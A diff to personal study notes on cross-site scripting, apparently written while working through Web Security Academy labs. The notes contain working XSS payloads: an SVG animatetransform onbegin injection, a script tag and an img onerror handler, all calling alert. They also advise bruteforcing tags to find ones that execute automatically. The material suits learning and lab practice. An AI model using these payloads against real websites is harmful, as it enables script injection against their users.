@@ -14,6 +14,7 @@ location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+o
 </script>
 IV reflected xss with SVG allowed
 https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+sometimes we can make use of multiple tags also like done  in above
 
 find how each tags work and what properties can be used to automatic execution of our script 
 bruteforce <> --> between them
@@ -24,6 +25,6 @@ some new HTML tags designed to trigger execution of JavaScript.
 Some useful ways of executing JavaScript are:
 <script>alert(document.domain)</script>
 <img src=1 onerror=alert(1)>
-
-2. 
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2. XSS in HTML tag ATTributes
 
